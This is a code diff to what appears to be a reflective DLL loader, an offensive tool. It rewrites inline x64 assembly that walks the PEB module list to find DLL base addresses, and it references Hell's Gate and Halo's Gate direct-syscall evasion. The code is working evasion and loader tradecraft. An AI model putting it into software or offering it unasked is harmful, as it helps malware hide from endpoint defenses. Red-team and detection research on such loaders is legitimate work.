@@ -66,6 +66,7 @@ VOID  HellDescent(VOID);
 DWORD halosGateDown(PVOID ntdllApiAddr, DWORD index);
 DWORD halosGateUp(PVOID ntdllApiAddr, DWORD index);
 DWORD getSyscallNumber(PVOID functionAddress);
+unsigned __int64 xstrlen(char* string);
 
 typedef PVOID  (WINAPI * tLoadLibraryA)  (LPCSTR);
 
@@ -617,74 +618,76 @@ __asm__(
     "jne getRdllBase \n"
     "mov rax, rcx \n"               // Return the base address of our reflective DLL
     "ret \n"                        // return initRdllAddr
+
+
 "getDllBase: \n"
+    "push rcx \n" // save our string arg on the top of the stack
+    "call xstrlen \n" // RAX will be the strlen
+    "sub rax, 0x4 \n" // subtract 4 from our string. Truncates the ".dll" or ".exe"
+    "mov r10, rax \n" // save strlen in the r10 reg
+    "pop rcx \n" // get our string arg from the top of the stack
+    "xor rbx, rbx \n"
+    "xor rdi, rdi \n" // Clear RDI
+    "xor rsi, rsi \n" // Clear RSI
     "mov rbx, gs:[0x60] \n"         // ProcessEnvironmentBlock // GS = TEB
     "mov rbx, [rbx+0x18] \n"        // _PEB_LDR_DATA
     "mov rbx, [rbx+0x20] \n"        // InMemoryOrderModuleList - First Entry (probably the host PE File)
-    "mov r11, rbx \n"
-"crawl: \n"
-    "push rbx \n"                   // just to save its value
-    "push rcx \n"
-    "mov rdx, [rbx+0x20] \n"        // DllBase
-    "mov rcx, rdx \n"
-    "call getExportDirectory \n"
-    "pop rcx \n"
-    "xor rbx, rbx \n"
-    "mov ebx, [rax+0x0c] \n"
-    "add rdx, rbx \n"               // ASCII name of the DLL
-    "call cmpstrings \n"
-    "pop rbx \n"
-    "cmp rax, 0x1 \n"
+    "mov r11, rbx \n" // save so we know the end of the modList
+  "crawl: \n"
+    "mov rdx, [rbx+0x50] \n" // BaseDllName Buffer - AKA Unicode string for module in InMemoryOrderModuleList
+    "push rcx \n" // save our string arg on the top of the stack
+    "mov rax, r10 \n" // reset our string counter
+    "call cmpDllStr \n" // see if our strings match
+    "pop rcx \n" // remove string arg from the top of the stack
+    "test rax, rax \n" // is cmpDllStr match?
     "je found \n"
     "mov rbx, [rbx] \n"             // InMemoryOrderLinks Next Entry
     "cmp r11, [rbx] \n"             // Are we back at the same entry in the list?
-    "jne crawl \n"
-    "xor rax, rax \n"               // DLL is not in InMemoryOrderModuleList, return NULL
+    "je failGetDllBase \n" // if we went through all modules in modList then return 0 to caller of getDllBase 
+    "jmp crawl \n"
+  "cmpDllStr: \n"
+    "mov sil, [rcx] \n" // move the byte in string that we pass as an arg to getDllBase() into the lowest byte of the RSI register
+    "mov dil, [rdx] \n" // move the byte in string from the InMemList into the lowest byte of the RDI register
+    "or sil, 0x20 \n" // convert to lowercase if uppercase
+    "or dil, 0x20 \n" // convert to lowercase if uppercase
+    "cmp dil, sil \n"   // cmp character byte in the strings
+    "jne failcmpDllStr \n" // if no match then return to the caller of cmpDllStr
+    "dec rax \n" // decrement the counter
+    "test rax, rax \n" // is counter zero?
+    "je matchStr \n" // if we matched the string 
+    "add rdx, 0x2 \n" // move the unicode string to the next byte and skip the 0x00
+    "inc rcx \n" // move our string to the next char
+    "jmp cmpDllStr \n" // compare the next string byte
+  "failcmpDllStr: \n"
+    "mov rax, 0xFFFF \n" // return 0xFFFF
+    "ret \n"
+  "matchStr: \n"
+    "xor rax, rax \n" // return 0x0 
+    "ret \n"
+  "failGetDllBase: \n"
+    "xor rax, rax \n" // return 0x0 
     "jmp end \n"
-"found: \n"
+  "found: \n"
     "mov rax, [rbx+0x20] \n"        // DllBase Address in process memory
-"end: \n"
-    "ret \n"
-"getFirstEntry: \n"
-    "mov rax, gs:[0x60] \n"         // ProcessEnvironmentBlock // GS = TEB
-    "mov rax, [rax+0x18] \n"        // _PEB_LDR_DATA
-    "mov rax, [rax+0x20] \n"        // InMemoryOrderModuleList - First Entry (probably the host PE File)
-    "ret \n"
-"getNextEntry: \n"
-    "mov rax, [rcx] \n"
-    "cmp rdx, [rax] \n"             // Are we back at the same entry in the list?
-    "jne notTheLast \n"
-    "xor rax, rax \n"
-"notTheLast: \n"
-    "ret \n"
-"getDllBaseFromEntry: \n"
-    "mov rax, [rcx+0x20] \n"
-    "ret \n"
-"cmpstrings: \n"
-    "xor rax, rax \n"               // counter
-"cmpchar: \n"
-    "mov sil, [rcx+rax] \n"         // load char
-    "cmp sil, 0x0 \n"
-    "je nolow1 \n"
-    "or sil, 0x20 \n"               // make lower case
-"nolow1: \n"
-    "mov dil, [rdx+rax] \n"         // load char
-    "cmp dil, 0x0 \n"
-    "je nolow2 \n"
-    "or dil, 0x20 \n"               // make lower case
-"nolow2: \n"
-    "cmp sil, dil \n"               // compare
-    "jne nonequal \n"
-    "cmp sil, 0x0 \n"               // end of string?
-    "je equal \n"
-    "inc rax \n"
-    "jmp cmpchar \n"
-"nonequal: \n"
-    "mov rax, 0x0 \n"               // return "false"
-    "ret \n"
-"equal: \n"
-    "mov rax, 0x1 \n"               // return "true"
-    "ret \n"
+  "end: \n"
+    "ret \n" // return to caller
+
+
+// Clobbers: RAX RCX
+"xstrlen:" // Get the string length for the string
+    "xchg rax, rcx \n"  // RAX = string address
+    "xor rcx, rcx \n"   
+    "ctLoop: \n"
+    "xor rbx, rbx \n"
+    "cmp bl, [rax] \n"  // are we at the null terminator for the string?
+    "je fLen \n"
+    "inc cl \n"         // increment the name string length counter
+    "inc rax \n"        // move to the next char of the string
+    "jmp short ctLoop \n"
+    "fLen: \n"
+    "xchg rax, rcx \n" 
+    "ret \n" 
+
 "getExportDirectory: \n"
     "mov r8, rcx \n"
     "mov ebx, [rcx+0x3C] \n"
@@ -903,5 +906,21 @@ __asm__(
     "mov r10, rcx \n"
     "mov eax, r11d \n"
     "syscall \n"
+    "ret \n"
+
+"getFirstEntry: \n"
+    "mov rax, gs:[0x60] \n"         // ProcessEnvironmentBlock // GS = TEB
+    "mov rax, [rax+0x18] \n"        // _PEB_LDR_DATA
+    "mov rax, [rax+0x20] \n"        // InMemoryOrderModuleList - First Entry (probably the host PE File)
+    "ret \n"
+"getNextEntry: \n"
+    "mov rax, [rcx] \n"
+    "cmp rdx, [rax] \n"             // Are we back at the same entry in the list?
+    "jne notTheLast \n"
+    "xor rax, rax \n"
+"notTheLast: \n"
+    "ret \n"
+"getDllBaseFromEntry: \n"
+    "mov rax, [rcx+0x20] \n"
     "ret \n"
 );
